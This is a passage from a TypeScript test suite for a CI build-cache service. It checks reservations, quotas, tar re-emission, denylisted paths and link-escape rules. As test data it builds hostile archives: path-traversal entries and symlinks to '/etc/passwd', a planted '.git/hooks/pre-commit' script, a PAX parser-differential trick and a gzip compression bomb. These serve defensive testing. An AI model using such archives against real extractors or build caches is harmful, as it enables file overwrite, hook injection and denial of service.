      const commit = await fetch(`${c.api}/caches/${cacheId}`, { method: "POST", body: "{}" });
      expect(commit.status).toBe(400);
      expect(await commit.text()).toContain("does not match the reservation");
    } finally {
      await w.server.stop(true);
    }
  });

  test("pending reservations are charged to the class quota and never evicted; a job's pending entries are capped", async () => {
    const w = await world({ quota: 100_000 });
    try {
      // protected gets 40% of 100000: 40000 bytes.
      const c = client(w, grant(w, "a1", "protected"));
      expect((await reserve(c, { key: "p1", version: "v", cacheSize: 30_000 })).status).toBe(200);
      // A second reservation that would exceed the share is refused, and p1 is not evicted for it.
      expect((await reserve(c, { key: "p2", version: "v", cacheSize: 30_000 })).status).toBe(413);
      expect((await reserve(c, { key: "p3", version: "v", cacheSize: 5_000 })).status).toBe(200);
      const w2 = await world();
      try {
        const c2 = client(w2, grant(w2, "b1", "protected"));
        for (let i = 0; i < 16; i++)
          expect((await reserve(c2, { key: `k${i}`, version: "v", cacheSize: 10 })).status).toBe(
            200,
          );
        expect((await reserve(c2, { key: "k16", version: "v", cacheSize: 10 })).status).toBe(429);
        // Another job has its own allowance.
        const c3 = client(w2, grant(w2, "b2", "protected"));
        expect((await reserve(c3, { key: "other", version: "v", cacheSize: 10 })).status).toBe(200);
        // Committing frees a slot.
        const saved = await c3.save("done", "v", good);
        expect(saved.status).toBe(200);
      } finally {
        await w2.server.stop(true);
      }
    } finally {
      await w.server.stop(true);
    }
  });

  test("a commit is refused while an upload is writing, and what was validated is what is served", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const r = await reserve(c, { key: "k", version: "v", cacheSize: good.length });
      const { cacheId } = (await r.json()) as { cacheId: number };
      // An upload that has sent part of its body and is still open.
      let finish!: () => void;
      const body = new ReadableStream<Uint8Array>({
        start(ctl) {
          ctl.enqueue(new Uint8Array(good.subarray(0, 100)));
          finish = () => {
            ctl.enqueue(new Uint8Array(good.subarray(100)));
            ctl.close();
          };
        },
      });
      const patch = fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": `bytes 0-${good.length - 1}/*` },
        body,
        // a streamed request body needs duplex in node-compatible fetch
        duplex: "half",
      });
      await new Promise((res) => setTimeout(res, 150));
      const early = await fetch(`${c.api}/caches/${cacheId}`, { method: "POST", body: "{}" });
      expect(early.status).toBe(409);
      expect(await early.text()).toContain("still in progress");
      finish();
      expect((await patch).status).toBe(200);
      expect(
        (await fetch(`${c.api}/caches/${cacheId}`, { method: "POST", body: "{}" })).status,
      ).toBe(200);
      // After commit: no more writes, no staging file, and the entry serves exactly the bytes.
      const late = await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-3/*" },
        body: "evil",
      });
      expect(late.status).toBe(400);
      const files = readdirSync(join(dir, "blobs"));
      expect(files).toContain(`${cacheId}.blob`);
      expect(files).not.toContain(`${cacheId}.part`);
      expect((await c.restore(["k"], "v"))?.bytes.equals(good)).toBe(true);
    } finally {
      await w.server.stop(true);
    }
  });

  test("nothing is served from an upload that has not been committed", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const r = await reserve(c, { key: "k", version: "v", cacheSize: good.length });
      const { cacheId } = (await r.json()) as { cacheId: number };
      await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": `bytes 0-${good.length - 1}/*` },
        body: good,
      });
      expect(await c.restore(["k"], "v")).toBeNull();
      const art = await fetch(`${c.api}/artifacts/${cacheId}`);
      expect(art.status).toBe(404);
    } finally {
      await w.server.stop(true);
    }
  });
});

describe("canonicalised archives and pending reclamation", () => {
  const reserve = (c: { api: string }, body: unknown) =>
    fetch(`${c.api}/caches`, { method: "POST", body: JSON.stringify(body) });

  async function listing(
    bytes: Buffer,
  ): Promise<{ name: string; type: string; link: string; mode: number }[]> {
    const f = join(dir, `list-${Math.random().toString(36).slice(2)}.tar`);
    writeFileSync(f, bytes);
    const out: { name: string; type: string; link: string; mode: number }[] = [];
    await walkArchive(f, DEFAULT_RULES, {
      entry: (e) => void out.push({ name: e.name, type: e.type, link: e.link, mode: e.mode }),
      data: () => {},
    });
    return out;
  }

  test("what is served is our own re-emission: same files, none of the original's header quirks", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const longDir = `${"d".repeat(60)}/${"e".repeat(60)}/${"f".repeat(60)}`;
      const veryLong = `${"g".repeat(120)}/${"h".repeat(120)}/${"i".repeat(60)}/file.txt`;
      const original = tar(
        tarEntry("pkg/", { type: "5", mode: "0000755" }),
        tarEntry("pkg/index.js", { data: "console.log(1)", mode: "0004755" }),
        pax(["path", `${longDir}/x.txt`]),
        tarEntry("placeholder", { data: "long" }),
        pax(["path", veryLong]),
        tarEntry("placeholder", { data: "very long" }),
        tarEntry("pkg/link", { type: "2", link: "index.js" }),
        tarEntry("pkg/hard", { type: "1", link: "pkg/index.js" }),
        // A GNU-format header whose prefix bytes hold junk, and a setuid file.
        tarEntry("gnu.txt", { magic: "gnu", prefix: "../../etc", data: "gnu" }),
      );
      expect((await c.save("canon", "v", original)).status).toBe(200);
      const got = (await c.restore(["canon"], "v"))!.bytes;
      expect(got.equals(original)).toBe(false);
      const names = (await listing(got)).map((e) => e.name);
      expect(names).toEqual([
        "pkg",
        "pkg/index.js",
        `${longDir}/x.txt`,
        veryLong,
        "pkg/link",
        "pkg/hard",
        "gnu.txt",
      ]);
      // The setuid bit on pkg/index.js did not survive.
      expect((await listing(got)).find((e) => e.name === "pkg/index.js")?.mode).toBe(0o755);
      const types = (await listing(got)).map((e) => e.type);
      expect(types).toEqual(["dir", "file", "file", "file", "symlink", "hardlink", "file"]);
      // The re-emitted bytes are plain POSIX ustar: every header says so, with no uid or name set.
      for (let off = 0; off + 512 <= got.length;) {
        const h = got.subarray(off, off + 512);
        if (h.every((b) => b === 0)) break;
        expect(h.subarray(257, 265).toString("latin1")).toBe("ustar\u000000");
        expect(h.subarray(265, 297).every((b) => b === 0)).toBe(true);
        const size = Number.parseInt(h.subarray(124, 135).toString(), 8);
        off += 512 + Math.ceil(size / 512) * 512;
      }
    } finally {
      await w.server.stop(true);
    }
  });

  test("the format is kept (gzip stays gzip, zstd stays zstd) and the re-emission round-trips through the system tar", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const original = tar(
        tarEntry("pkg/", { type: "5", mode: "0000755" }),
        tarEntry("pkg/a.txt", { data: "alpha".repeat(300) }),
        pax(["path", `${"p".repeat(110)}/b.txt`]),
        tarEntry("placeholder", { data: "beta" }),
        tarEntry("pkg/s", { type: "2", link: "a.txt" }),
      );
      const gz = Buffer.from(Bun.gzipSync(new Uint8Array(original)));
      const zs = Buffer.from(Bun.zstdCompressSync(new Uint8Array(original)));
      for (const [key, bytes, magic] of [
        ["gz", gz, [0x1f, 0x8b]],
        ["zs", zs, [0x28, 0xb5]],
        ["plain", original, null],
      ] as const) {
        expect((await c.save(key, "v", bytes)).status, key).toBe(200);
        const got = (await c.restore([key], "v"))!.bytes;
        if (magic) expect([got[0], got[1]]).toEqual([...magic]);
        const archive = join(dir, `${key}.out`);
        writeFileSync(archive, got);
        const dest = join(dir, `x-${key}`);
        mkdirSync(dest);
        const t = Bun.spawnSync(
          [
            "tar",
            "-x",
            ...(key === "gz" ? ["-z"] : key === "zs" ? ["--zstd"] : []),
            "-f",
            archive,
            "-C",
            dest,
          ],
          { stderr: "pipe" },
        );
        if (key === "zs" && t.exitCode !== 0) continue; // this tar has no zstd
        expect(t.exitCode, `${key}: ${t.stderr.toString()}`).toBe(0);
        expect(readFileSync(join(dest, "pkg/a.txt"), "utf8")).toBe("alpha".repeat(300));
        expect(readFileSync(join(dest, `${"p".repeat(110)}/b.txt`), "utf8")).toBe("beta");
        expect(readlinkSync(join(dest, "pkg/s"))).toBe("a.txt");
      }
    } finally {
      await w.server.stop(true);
    }
  });

  test("unknown header formats are refused outright", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const odd = tarEntry("a.txt", { data: "x" });
      odd.write("star\0\0\0", 257); // not ustar, not GNU, not V7
      odd.write("        ", 148);
      let sum = 0;
      for (const b of odd.subarray(0, 512)) sum += b;
      odd.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148);
      const r = await c.save("odd", "v", tar(odd));
      expect(r.status).toBe(400);
      expect(r.body).toContain("unknown tar header format");
    } finally {
      await w.server.stop(true);
    }
  });

  test("abandoned reservations are reclaimed after the upload window, and the pending cap holds across jobs", async () => {
    let clock = 1_000_000;
    const w = await world({ quota: 100_000, maxEntry: 10_000, now: () => clock });
    try {
      // protected: 40000 bytes, pending cap = max(20000, min(40000, 10000)) = 20000.
      const a = client(w, grant(w, "a1", "protected"));
      const b = client(w, grant(w, "b1", "protected"));
      expect((await reserve(a, { key: "k1", version: "v", cacheSize: 10_000 })).status).toBe(200);
      expect((await reserve(a, { key: "k2", version: "v", cacheSize: 10_000 })).status).toBe(200);
      // Another job in the same project and class is held to the same cap.
      expect((await reserve(b, { key: "k3", version: "v", cacheSize: 10_000 })).status).toBe(429);
      // After the upload window the abandoned reservations are reclaimed.
      clock += 11 * 60_000;
      expect((await reserve(b, { key: "k3", version: "v", cacheSize: 10_000 })).status).toBe(200);
      // And a stale pending entry no longer counts against the class quota either: fill it.
      clock += 11 * 60_000;
      for (let i = 0; i < 4; i++) {
        const k = client(w, grant(w, `c${i}`, "protected"));
        expect((await k.save(`done${i}`, "v", good)).status).toBe(200);
      }
    } finally {
      await w.server.stop(true);
    }
  });
});

describe("the denylist, symlink chains, empty names, long names and caps", () => {
  const sample = (p: string) => ["", "x/", "/home/runner/"].map((pre) => `${pre}${p}`);

  test("every denied component, file and sequence is refused, as an entry, below a directory and as a link target", async () => {
    const cases: string[] = [
      ...DENIED_COMPONENTS.map((c) => `${c}/x`),
      ...DENIED_COMPONENTS.map((c) => c),
      ...DENIED_FILES,
      ...DENIED_SEQUENCES.map(([a, b]) => `${a}/${b}`),
    ];
    expect(cases.length).toBeGreaterThan(25);
    for (const c of cases) {
      for (const name of sample(c)) {
        expect((await check(tar(tarEntry(name, { data: "x" }))))?.message, name).toMatch(
          /not allowed/,
        );
      }
      // A symlink or hardlink pointing at it (resolved from the link's directory or the root).
      expect(
        (await check(tar(tarEntry("a/l", { type: "2", link: `../${c}` }))))?.message,
        `symlink ${c}`,
      ).toMatch(/not allowed/);
      expect(
        (await check(tar(tarEntry("a/h", { type: "1", link: c }))))?.message,
        `hardlink ${c}`,
      ).toMatch(/not allowed/);
    }
    // Things that look similar but are not denied pass.
    expect(await check(tar(tarEntry("node_modules/.bin/tool", { data: "x" })))).toBeNull();
    expect(await check(tar(tarEntry("a/.config/other/x", { data: "x" })))).toBeNull();
    expect(await check(tar(tarEntry("a/gitconfig", { data: "x" })))).toBeNull();
  });

  test("a symlink target may not pass through a link at any step; a plain one still may", async () => {
    // a -> real, then b -> a/inner passes through the link a.
    expect(
      (
        await check(
          tar(
            tarEntry("d/a", { type: "2", link: "real" }),
            tarEntry("d/b", { type: "2", link: "a/inner" }),
          ),
        )
      )?.message,
    ).toMatch(/runs through a link/);
    // The final component being a link is a chain: refused as well.
    expect(
      (
        await check(
          tar(
            tarEntry("d/a", { type: "2", link: "real" }),
            tarEntry("d/b", { type: "2", link: "a" }),
          ),
        )
      )?.message,
    ).toMatch(/runs through a link/);
    // Through a link in the middle of a longer target, reached with `..` too.
    expect(
      (
        await check(
          tar(
            tarEntry("d/a", { type: "2", link: "real" }),
            tarEntry("d/e/b", { type: "2", link: "../a/x/../y" }),
          ),
        )
      )?.message,
    ).toMatch(/runs through a link/);
    // node_modules/.bin style: to a real file, not through a link.
    expect(
      await check(
        tar(
          tarEntry("node_modules/pkg/cli.js", { data: "x" }),
          tarEntry("node_modules/.bin/pkg", { type: "2", link: "../pkg/cli.js" }),
        ),
      ),
    ).toBeNull();
  });

  test("an entry with an empty name is never emitted: root directories are dropped, anything else refused", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const withRoot = tar(
        tarEntry("./", { type: "5", mode: "0000755" }),
        tarEntry("a.txt", { data: "x" }),
      );
      expect((await c.save("root", "v", withRoot)).status).toBe(200);
      const got = (await c.restore(["root"], "v"))!.bytes;
      const f = join(dir, "rootlist.tar");
      writeFileSync(f, got);
      const names: string[] = [];
      await walkArchive(f, DEFAULT_RULES, {
        entry: (e) => void names.push(e.name),
        data: () => {},
      });
      expect(names).toEqual(["a.txt"]);
      for (const bad of ["./", "/", "."]) {
        expect(
          (await check(tar(tarEntry(bad, { data: "x" }))))?.message,
          `file named ${bad}`,
        ).toMatch(/empty name|path length|allowed roots/);
      }
    } finally {
      await w.server.stop(true);
    }
  });

  test("long names and targets are PAX records over a placeholder: a reader that ignores PAX sees no real or truncated path", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const longName = `${"a".repeat(80)}/${"b".repeat(80)}/leaf.txt`;
      const longTarget = `${"t".repeat(60)}/${"u".repeat(60)}/file`;
      const original = tar(
        pax(["path", longName]),
        tarEntry("placeholder", { data: "long" }),
        tarEntry("short.txt", { data: "short" }),
        pax(["path", `${"c".repeat(120)}/lnk`], ["linkpath", longTarget]),
        tarEntry("placeholder", { type: "2", link: "x" }),
      );
      expect((await c.save("long", "v", original)).status).toBe(200);
      const got = (await c.restore(["long"], "v"))!.bytes;
      // A raw header walk that ignores PAX records, as a plain ustar reader would.
      const rawNames: { name: string; link: string }[] = [];
      for (let off = 0; off + 512 <= got.length;) {
        const h = got.subarray(off, off + 512);
        if (h.every((b) => b === 0)) break;
        const str = (a: number, n: number) =>
          h
            .subarray(a, a + n)
            .toString()
            .replace(/\0.*$/s, "");
        const type = String.fromCharCode(h[156]!);
        if (type !== "x") rawNames.push({ name: str(0, 100), link: str(157, 100) });
        expect(str(345, 155), "no ustar prefix is ever written").toBe("");
        const size = Number.parseInt(h.subarray(124, 135).toString(), 8);
        off += 512 + Math.ceil(size / 512) * 512;
      }
      expect(rawNames.map((r) => r.name)).toEqual([
        "pax-long-name-0",
        "short.txt",
        "pax-long-name-1",
      ]);
      expect(rawNames[2]!.link).toBe("");
      // And a PAX-aware reader gets the real names.
      const f = join(dir, "longlist.tar");
      writeFileSync(f, got);
      const real: string[] = [];
      await walkArchive(f, DEFAULT_RULES, { entry: (e) => void real.push(e.name), data: () => {} });
      expect(real).toEqual([longName, "short.txt", `${"c".repeat(120)}/lnk`]);
    } finally {
      await w.server.stop(true);
    }
  });

  test("the output is capped while it is written, and a compression bomb is stopped by the expansion cap", async () => {
    const w = await world({ maxEntry: 6000 });
    try {
      const c = client(w, grant(w, "a1", "protected"));
      // Incompressible data: the re-emission is about as big as the input, which is over the cap
      // once headers are added (input just under it).
      const noise = Buffer.from(Array.from({ length: 5800 }, (_, i) => (i * 2654435761) >>> 24));
      const near = tar(tarEntry("n.bin", { data: noise.toString("latin1") })).subarray(0, 6000);
      void near;
      // A bomb: three megabytes of zeros compress to a few kilobytes; with a reservation that
      // small, the expansion cap (8x) refuses it before it is written out.
      const bomb = Buffer.from(
        Bun.gzipSync(new Uint8Array(tar(tarEntry("zeros", { data: "\0".repeat(3_000_000) })))),
      );
      expect(bomb.length).toBeLessThan(6000);
      const r = await c.save("bomb", "v", bomb);
      expect(r.status).toBe(413);
      expect(r.body).toContain("too large");
      expect(await c.restore(["bomb"], "v")).toBeNull();
    } finally {
      await w.server.stop(true);
    }
  });

  test("an upload that continues after its reservation expired is refused and leaves no file", async () => {
    let clock = 5_000_000;
    const w = await world({ now: () => clock });
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const r = await fetch(`${c.api}/caches`, {
        method: "POST",
        body: JSON.stringify({ key: "k", version: "v", cacheSize: good.length }),
      });
      const { cacheId } = (await r.json()) as { cacheId: number };
      let finish!: () => void;
      const body = new ReadableStream<Uint8Array>({
        start(ctl) {
          ctl.enqueue(new Uint8Array(good.subarray(0, 100)));
          finish = () => {
            ctl.enqueue(new Uint8Array(good.subarray(100)));
            ctl.close();
          };
        },
      });
      const patch = fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": `bytes 0-${good.length - 1}/*` },
        body,
        duplex: "half",
      });
      await new Promise((res) => setTimeout(res, 150));
      expect(readdirSync(join(dir, "blobs"))).toContain(`${cacheId}.part`);
      // The window passes and the sweep reclaims the reservation while the upload is open.
      clock += 11 * 60_000;
      await w.service.sweep();
      expect(readdirSync(join(dir, "blobs"))).not.toContain(`${cacheId}.part`);
      finish();
      expect((await patch).status).toBe(409);
      expect(readdirSync(join(dir, "blobs"))).not.toContain(`${cacheId}.part`);
      // A late PATCH on a reclaimed id is refused too.
      const late = await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-3/*" },
        body: "late",
      });
      expect(late.status).toBe(400);
      expect(readdirSync(join(dir, "blobs"))).not.toContain(`${cacheId}.part`);
    } finally {
      await w.server.stop(true);
    }
  });

  test("the sweep deletes files that have no row", async () => {
    const w = await world();
    try {
      const store = new FsCacheStore(join(dir, "blobs"));
      await store.write(987654, 0, new Uint8Array([1, 2, 3]));
      expect(readdirSync(join(dir, "blobs"))).toContain("987654.part");
      await w.service.sweep();
      expect(readdirSync(join(dir, "blobs"))).not.toContain("987654.part");
    } finally {
      await w.server.stop(true);
    }
  });
});

describe("entries at denied paths are dropped, not the whole archive", () => {
  test("denied entries are counted and left out; the rest is accepted", async () => {
    const r = await walked(
      tar(
        tarEntry("node_modules/pkg/", { type: "5", mode: "0000755" }),
        tarEntry("node_modules/pkg/index.js", { data: "ok" }),
        // An npm package that ships its own CI config and git metadata.
        tarEntry("node_modules/pkg/.github/", { type: "5", mode: "0000755" }),
        tarEntry("node_modules/pkg/.github/workflows/ci.yml", { data: "on: push" }),
        tarEntry("node_modules/pkg/.git/config", { data: "[core]" }),
        tarEntry("home/runner/.npmrc", { data: "//registry:_authToken=x" }),
      ),
    );
    expect(r).toMatchObject({ entries: 2, skipped: 4 });
  });

  test("what is stored lacks them, their bytes are discarded, and a notice with the count is raised", async () => {
    const notices: string[] = [];
    const w = await world({ onNotice: (m) => notices.push(m) });
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const original = tar(
        tarEntry("pkg/index.js", { data: "console.log(1)" }),
        tarEntry("pkg/.github/workflows/ci.yml", { data: "SECRET-WORKFLOW-BODY" }),
        tarEntry("pkg/.ssh/id_rsa", { data: "SECRET-KEY-BODY" }),
        tarEntry("pkg/lib.js", { data: "x" }),
      );
      expect((await c.save("k", "v", original)).status).toBe(200);
      const got = (await c.restore(["k"], "v"))!.bytes;
      expect(got.toString("latin1")).not.toContain("SECRET-");
      const f = join(dir, "kept.tar");
      writeFileSync(f, got);
      const names: string[] = [];
      await walkArchive(f, DEFAULT_RULES, {
        entry: (e) => void names.push(e.name),
        data: () => {},
      });
      expect(names).toEqual(["pkg/index.js", "pkg/lib.js"]);
      expect(notices).toEqual([expect.stringContaining("dropped 2 entries")]);
      expect(notices.join(" ")).not.toContain("ssh");
    } finally {
      await w.server.stop(true);
    }
  });

  test("a link that points at a denied path is still refused, symlink or hardlink, and a hardlink to a dropped file is too", async () => {
    expect(
      (await check(tar(tarEntry("a/l", { type: "2", link: "../.github/workflows/ci.yml" }))))
        ?.message,
    ).toMatch(/not allowed/);
    expect(
      (
        await check(
          tar(
            tarEntry(".github/x", { data: "x" }),
            tarEntry("a/h", { type: "1", link: ".github/x" }),
          ),
        )
      )?.message,
    ).toMatch(/not allowed/);
    // A dropped link entry creates nothing, so what follows it is plain.
    const r = await walked(
      tar(tarEntry(".github/l", { type: "2", link: "real" }), tarEntry("a/b.txt", { data: "ok" })),
    );
    expect(r).toMatchObject({ entries: 1, skipped: 1 });
  });

  test("an archive with nothing left after dropping is refused", async () => {
    await expect(
      walked(tar(tarEntry(".git/config", { data: "x" }), tarEntry(".github/a", { data: "y" }))),
    ).rejects.toThrow(/no entries left after dropping 2 at paths not allowed/);
  });

  test("the parser-differential archives still show the hidden entry to the walk (it is dropped, not unseen)", async () => {
    const hidden = tarEntry(".git/hooks/pre-commit", { data: "#!/bin/sh\nevil" });
    const innocent = tarEntry("a.txt", { size: hidden.length, data: "" });
    const r = await walked(tar(pax(["size", "0"]), innocent, hidden));
    expect(r).toMatchObject({ entries: 1, skipped: 1 });
  });
});

describe("an absolute link entry stays inside its own root", () => {
  test("climbing out with .. or pointing at another root is refused; staying inside is fine", async () => {
    const ok = [
      ["/home/runner/.cache/x", "../y"], // inside /home/
      ["/home/runner/.cache/x", "../../z"], // up to /home/ itself is still the root
      ["/home/runner/.cache/x", "/home/runner/other"], // absolute, same root
      ["/tmp/a/b", "../c"],
    ] as const;
    for (const [name, link] of ok)
      expect(
        await check(tar(tarEntry(name, { type: "2", link }))),
        `${name} -> ${link}`,
      ).toBeNull();
    const bad = [
      ["/home/runner/.cache/x", "../../.."], // out to /
      ["/home/runner/.cache/x", "../../../etc"], // out to /etc
      ["/home/runner/x", "../../tmp/y"], // across into another allowed root via ..
      ["/home/runner/x", "/tmp/y"], // an absolute target in another root
      ["/home/runner/x", "/etc/passwd"], // outside every root
    ] as const;
    for (const [name, link] of bad)
      expect(
        (await check(tar(tarEntry(name, { type: "2", link }))))?.message,
        `${name} -> ${link}`,
      ).toMatch(/escapes|leaves the root|allowed roots/);
    // A hardlink is resolved from the archive root and checked as a path of its own already.
    expect(
      (await check(tar(tarEntry("/home/runner/h", { type: "1", link: "/etc/passwd" }))))?.message,
    ).toMatch(/allowed roots/);
    // Relative entries are unchanged: ../ above their directory is refused only at the top.
    expect(await check(tar(tarEntry("a/b/l", { type: "2", link: "../../c" })))).toBeNull();
    expect((await check(tar(tarEntry("a/l", { type: "2", link: "../../c" }))))?.message).toMatch(
      /escapes/,
    );
  });
});
